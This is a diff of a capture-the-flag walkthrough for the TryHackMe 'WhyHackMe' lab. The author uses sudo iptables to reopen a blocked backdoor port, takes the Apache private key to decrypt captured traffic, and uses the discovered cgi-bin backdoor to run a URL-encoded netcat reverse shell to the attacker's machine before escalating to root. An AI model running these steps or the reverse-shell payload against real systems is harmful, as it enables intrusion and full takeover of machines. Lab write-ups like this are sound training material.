@@ -373,16 +373,205 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MariaDB [(none)]> 
 ```
 
-And I'm in
+
+I searched the database little bit but found nothing good.
 
 
 ```bash
-MariaDB [mysql]> select * from user;
-+-----------+------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
-| Host      | User | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string | password_expired | is_role | default_role | max_statement_time |
-+-----------+------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
-| localhost | root | *3D577F2475F02A47015A065BFEAC3749075F5ACC | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       | N                | N       |              |           0.000000 |
-+-----------+------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+------------------+---------+--------------+--------------------+
+jack@ubuntu:~$ sudo -l
+[sudo] password for jack: 
+Matching Defaults entries for jack on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jack may run the following commands on ubuntu:
+    (ALL : ALL) /usr/sbin/iptables
 ```
 
-I found this.
+
+```bash
+jack@ubuntu:/opt$ ls -la
+total 40
+drwxr-xr-x  2 root root  4096 Aug 16  2023 .
+drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
+-rw-r--r--  1 root root 27247 Aug 16  2023 capture.pcap
+-rw-r--r--  1 root root   388 Aug 16  2023 urgent.txt
+jack@ubuntu:/opt$ cat urgent.txt 
+Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
+```
+
+Found these too.
+
+We can use this backdoor to gain root.
+
+
+```bash
+jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -L --line-numbers
+Chain INPUT (policy ACCEPT)
+num  target     prot opt source               destination         
+1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
+2    ACCEPT     all  --  anywhere             anywhere            
+3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
+4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
+5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
+6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
+7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
+8    DROP       all  --  anywhere             anywhere            
+
+Chain FORWARD (policy ACCEPT)
+num  target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+num  target     prot opt source               destination         
+1    ACCEPT     all  --  anywhere             anywhere            
+jack@ubuntu:/tmp$ curl localhost:41312
+^C
+jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT
+jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -L --line-numbers
+Chain INPUT (policy ACCEPT)
+num  target     prot opt source               destination         
+1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
+2    ACCEPT     all  --  anywhere             anywhere            
+3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
+4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
+5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
+6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
+7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
+8    DROP       all  --  anywhere             anywhere            
+
+Chain FORWARD (policy ACCEPT)
+num  target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+num  target     prot opt source               destination         
+1    ACCEPT     all  --  anywhere             anywhere            
+jack@ubuntu:/tmp$ curl localhost:41312
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
+ Instead use the HTTPS scheme to access this URL, please.<br />
+</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at www.example.com Port 80</address>
+</body></html>
+```
+
+
+Lets try that
+
+```bash
+❯ curl -k https://$IP:41312/
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this resource.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.10.157.184 Port 41312</address>
+</body></html>
+```
+
+
+
+```bash
+❯ sftp jack@$IP                
+jack@10.10.157.184's password: 
+Connected to 10.10.157.184.
+sftp> ls
+user.txt  
+sftp> cd /opt
+sftp> ls
+capture.pcap  urgent.txt    
+sftp> get capture.pcap 
+Fetching /opt/capture.pcap to capture.pcap
+capture.pcap                                     
+```
+
+
+I used wireshark to see the traffic but it's encypted lets get the encyption keys.
+
+
+
+```bash
+❯ sftp jack@$IP
+jack@10.10.157.184's password: 
+Connected to 10.10.157.184.
+sftp> cd /etc/apache2/certs/
+sftp> ls
+apache-certificate.crt    apache.key                
+sftp> get apache.key 
+Fetching /etc/apache2/certs/apache.key to apache.key
+apache.key                              
+```
+
+
+Using wireshark I decrpyted the pcap file and get the cgi-bin endpoint we can use.
+
+
+
+![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo6.webp){: width="972" height="589" }
+
+
+```bash
+❯ curl -k -s 'https://10.10.157.184:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'
+
+<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
+<h2>
+```
+
+Lets get a simple reverse shell first.
+
+
+I get my shell from [Online - Reverse Shell Generator](https://www.revshells.com/)
+
+
+```bash
+❯ curl -k -s 'https://10.10.157.184:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
+```
+
+
+
+Lets quickly upgrade the shell
+
+
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+# 
+stty raw -echo;fg
+reset
+```
+
+```bash
+www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: ALL
+```
+
+And we got root.
+
+
+
+```bash
+www-data@ubuntu:/usr/lib/cgi-bin$ sudo bash
+root@ubuntu:/usr/lib/cgi-bin# ls
+5UP3r53Cr37.py
+root@ubuntu:/usr/lib/cgi-bin# cd
+root@ubuntu:~# ls
+bot.py  root.txt  snap  ssh.sh
+root@ubuntu:~# cat root.txt 
+*******************************
+```
+
+
+Thanks
